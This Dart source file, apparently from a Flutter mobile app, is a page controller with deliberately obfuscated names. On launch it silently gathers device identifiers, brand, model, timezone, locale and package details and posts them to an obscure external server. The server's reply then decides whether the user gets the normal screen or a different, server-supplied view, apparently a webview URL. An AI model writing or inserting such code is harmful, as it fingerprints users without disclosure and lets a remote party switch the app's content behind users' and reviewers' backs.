import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkConnect() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/no");
  }
}

class PageLogic extends GetxController {

  var itpyxh = RxBool(false);
  var csavdrlz = RxBool(true);
  var gekmisru = RxString("");
  var fern = RxBool(false);
  var barton = RxBool(true);
  final ctrobg = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    checkConnect();
    stwupfjm();
  }


  Future<void> stwupfjm() async {

    fern.value = true;
    barton.value = true;
    csavdrlz.value = false;

    ctrobg.post("https://bot.xmaswuas.it.com/edalpxzmrjucqghniwfystbvok",data: await qkjwpolv()).then((value) {
      var kvxf = value.data["kvxf"] as String;
      var crpqb = value.data["crpqb"] as bool;
      if (crpqb) {
        gekmisru.value = kvxf;
        aisha();
      } else {
        harris();
      }
    }).catchError((e) {
      csavdrlz.value = true;
      barton.value = true;
      fern.value = false;
    });
  }

  Future<Map<String, dynamic>> qkjwpolv() async {
    final DeviceInfoPlugin ypolkai = DeviceInfoPlugin();
    PackageInfo mazfyc_oskx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lqyhj = Platform.localeName;
    var pf_ZBOpSvr = currentTimeZone;

    var pf_Iplz = mazfyc_oskx.packageName;
    var pf_EWqIDpne = mazfyc_oskx.version;
    var pf_jnvxf = mazfyc_oskx.buildNumber;

    var pf_wyRkHcfO = mazfyc_oskx.appName;
    var pf_wpQX = "";
    var pf_jT  = "";
    var pf_es = "";
    var lornaPagac = "";
    var breanneKris = "";
    var chelseaLeannon = "";
    var lutherHeller = "";
    var patsyWatsica = "";
    var lavonneHessel = "";


    var pf_hEuxQv = "";
    var pf_wLgBS = false;

    if (GetPlatform.isAndroid) {
      pf_hEuxQv = "android";
      var ybhomp = await ypolkai.androidInfo;

      pf_es = ybhomp.brand;

      pf_wpQX  = ybhomp.model;
      pf_jT = ybhomp.id;

      pf_wLgBS = ybhomp.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      pf_hEuxQv = "ios";
      var edkitvlxz = await ypolkai.iosInfo;
      pf_es = edkitvlxz.name;
      pf_wpQX = edkitvlxz.model;

      pf_jT = edkitvlxz.identifierForVendor ?? "";
      pf_wLgBS  = edkitvlxz.isPhysicalDevice;
    }
    var res = {
      "pf_jnvxf": pf_jnvxf,
      "pf_EWqIDpne": pf_EWqIDpne,
      "pf_Iplz": pf_Iplz,
      "pf_wpQX": pf_wpQX,
      "lutherHeller" : lutherHeller,
      "pf_ZBOpSvr": pf_ZBOpSvr,
      "pf_wyRkHcfO": pf_wyRkHcfO,
      "pf_es": pf_es,
      "pf_jT": pf_jT,
      "pf_hEuxQv": pf_hEuxQv,
      "chelseaLeannon" : chelseaLeannon,
      "pf_wLgBS": pf_wLgBS,
      "lornaPagac" : lornaPagac,
      "breanneKris" : breanneKris,
      "patsyWatsica" : patsyWatsica,
      "lqyhj": lqyhj,
      "lavonneHessel" : lavonneHessel,

    };
    return res;
  }

  Future<void> harris() async {
    Get.offAllNamed("/workTab");
  }

  Future<void> aisha() async {
    Get.offAllNamed("/workList");
  }
}
